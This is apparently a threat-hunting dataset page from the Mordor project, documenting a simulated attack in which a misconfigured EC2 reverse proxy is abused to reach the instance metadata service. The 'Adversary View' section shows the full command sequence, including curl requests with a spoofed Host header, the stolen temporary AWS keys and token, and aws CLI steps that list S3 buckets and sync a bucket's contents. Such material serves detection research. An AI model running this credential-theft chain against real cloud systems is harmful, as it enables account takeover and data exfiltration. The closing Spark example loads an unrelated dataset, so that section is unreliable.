# EC2 Proxy Abuse for S3 Data Exfiltration

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDAWS-200914011940 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2020/09/13 |
| platform              | AWS |
| Tactic(s)             | ['[TA0001](https://attack.mitre.org/tactics/TA0001)', '[TA0003](https://attack.mitre.org/tactics/TA0003)', '[TA0004](https://attack.mitre.org/tactics/TA0004)', '[TA0005](https://attack.mitre.org/tactics/TA0005)', '[TA0009](https://attack.mitre.org/tactics/TA0009)'] |
| Technique(s)          | ['[T1078.004](https://attack.mitre.org/techniques/T1078/004)', '[T1530](https://attack.mitre.org/techniques/T1530)'] |
| Simulaton Environment | https://github.com/OTRF/mordor-labs/tree/master/environments/windows/shire |
| Simulation Scripts    | ['https://github.com/OTRF/mordor-labs/tree/master/environments/aws/cloud-breach-s3'] |
| Dataset cloud           | ['https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/aws/collection/ec2_proxy_s3_exfiltration.zip'] |
| References        | None |

## Dataset Description
This dataset represents adversaries abusing a misconfigured EC2 reverse proxy to obtain instance profile keys and eventually exfiltrate files from an S3 bucket.

## Adversary View
```
> curl -s http://35.174.154.220/latest/meta-data/iam/security-credentials/ -H "Host:169.254.169.254"                                            
MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0                                                                                                                                                              >

> curl -s http://35.174.154.220/latest/meta-data/iam/security-credentials/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0 -H "Host:169.254.169.254"
{
"Code" : "Success",
"LastUpdated" : "2020-09-14T00:49:26Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIA5FLZVX4OPVKKVBMX",
"SecretAccessKey" : "aD8Hchl4f1BrbfgFvwEBVRZ0oCXrifESaC3B0a03",
"Token" : "IQoJb3JpZ2luX2VjEKn//////////wEaCXVzLWVhc3QtMSJGMEQCIFTK4qBuNfTj4qfV/CBhpMG4oscNJqG4y8PRznBlTeZIAiAp1u0soABpzcXhQdFLAc7IRny5FOLjhx3yH2G1qQRKMiq9Awiy//////////8BEAEaDDkwNDg4MjY2NzI5MiIMP0wDeotbCrscCOjEKpEDxk0KsgPdJdS8v5dM11k7izG5zOosK7lN4Pry9xiTntV473XlkmchQIuUsHpXOBK/7HE3Xas423pOk+OO+888A6q9F4gW5q34f0KIbhGI/uFhrOR2gI1AX0LB96QWcYRSmxWRnv7G6mgGD7HqLfyAHdcKuyj7kLv1XJHv+7SZ0qUsy/reCApl4Vo+klcPS4ropiiaDar2JF0ua4MF44cRHPFuKoxK1d++1ZpWAhVC90J091H+VndvXnH2WknOB8eB+h4btDEqOH4ogeKM4DBhhZn24yBl2zHSKT/TmUCaXarbzrVlov8kUfmHdA8Ei5/btKhk4NYQRLONn8/Ld7KyQ6jWCdGflNe7SbZXEaokpetcC2Kr3Tbh/H57HE+krJQAvQsD47vLWbs8ev6pm71YpyvfwDUEmovOfQrzTQonLLJV/2VXoSWgsaxDuTgfbC44W0x4J41k+N9zDxz+sYN+9Yzf3v2X28e74dkiyTR/kL4xg31FeK8RZHFort4UYsZfsHJx1GKUcCtWAYeSKQfhKfIw3vv6+gU67AGKYvQMHmefFegReXp1hh7kuQmM4D5dLahzvKa5iOOpxzX8qZ9nLahD07V4enDP4NhdStimm8G2gfa2lKoBjVbut+aI5mG1NcfjSV3SARpX2MboxQlo+DWlOT0Q7VQ9W96EVUOPQy6Yliuala7b36Kqt2jzWwUpRp8IpJkiwVdVfO68B1ncBz9fqHb+9K6u0dclOzmclTXC38wR2vqLOvad69oPKRBEsuELzl6WhDIVLhMbPmVlK0ZkT/phZYTrubq8J+kolJFASTKuVSrB2BDLxWW5cDxnevO+Wew/QenMXpi/HVzT9QRelXXz6A==",
"Expiration" : "2020-09-14T07:10:27Z"
}

> aws configure --profile erratic
AWS Access Key ID [None]: ASIA5FLZVX4OPVKKVBMX
AWS Secret Access Key [None]: aD8Hchl4f1BrbfgFvwEBVRZ0oCXrifESaC3B0a03
Default region name [None]: us-east-1
Default output format [None]: json

> echo aws_session_token = "IQoJb3JpZ2luX2VjEKn//////////wEaCXVzLWVhc3QtMSJGMEQCIFTK4qBuNfTj4qfV/CBhpMG4oscNJqG4y8PRznBlTeZIAiAp1u0soABpzcXhQdFLAc7IRny5FOLjhx3yH2G1qQRKMiq9Awiy//////////8BEAEaDDkwNDg4MjY2NzI5MiIMP0wDeotbCrscCOjEKpEDxk0KsgPdJdS8v5dM11k7izG5zOosK7lN4Pry9xiTntV473XlkmchQIuUsHpXOBK/7HE3Xas423pOk+OO+888A6q9F4gW5q34f0KIbhGI/uFhrOR2gI1AX0LB96QWcYRSmxWRnv7G6mgGD7HqLfyAHdcKuyj7kLv1XJHv+7SZ0qUsy/reCApl4Vo+klcPS4ropiiaDar2JF0ua4MF44cRHPFuKoxK1d++1ZpWAhVC90J091H+VndvXnH2WknOB8eB+h4btDEqOH4ogeKM4DBhhZn24yBl2zHSKT/TmUCaXarbzrVlov8kUfmHdA8Ei5/btKhk4NYQRLONn8/Ld7KyQ6jWCdGflNe7SbZXEaokpetcC2Kr3Tbh/H57HE+krJQAvQsD47vLWbs8ev6pm71YpyvfwDUEmovOfQrzTQonLLJV/2VXoSWgsaxDuTgfbC44W0x4J41k+N9zDxz+sYN+9Yzf3v2X28e74dkiyTR/kL4xg31FeK8RZHFort4UYsZfsHJx1GKUcCtWAYeSKQfhKfIw3vv6+gU67AGKYvQMHmefFegReXp1hh7kuQmM4D5dLahzvKa5iOOpxzX8qZ9nLahD07V4enDP4NhdStimm8G2gfa2lKoBjVbut+aI5mG1NcfjSV3SARpX2MboxQlo+DWlOT0Q7VQ9W96EVUOPQy6Yliuala7b36Kqt2jzWwUpRp8IpJkiwVdVfO68B1ncBz9fqHb+9K6u0dclOzmclTXC38wR2vqLOvad69oPKRBEsuELzl6WhDIVLhMbPmVlK0ZkT/phZYTrubq8J+kolJFASTKuVSrB2BDLxWW5cDxnevO+Wew/QenMXpi/HVzT9QRelXXz6A==" >> ~/.aws/credentials 

> aws s3 ls --profile erratic
2020-09-13 20:00:32 mordorctstack-s3bucketforcloudtrail-1gj7vvt2ul642
2020-09-13 19:59:59 mordors3stack-s3bucket-llp2yingx64a

> aws s3 ls mordors3stack-s3bucket-llp2yingx64a --profile erratic
2020-09-13 20:00:26         89 ring.txt

> aws s3 ls mordors3stack-s3bucket-llp2yingx64a --profile erratic
2020-09-13 20:00:26         89 ring.txt

> aws s3 sync s3://mordors3stack-s3bucket-llp2yingx64a . --profile erratic                                   
download: s3://mordors3stack-s3bucket-llp2yingx64a/ring.txt to ./ring.txt
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/empire_invoke_psexec.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        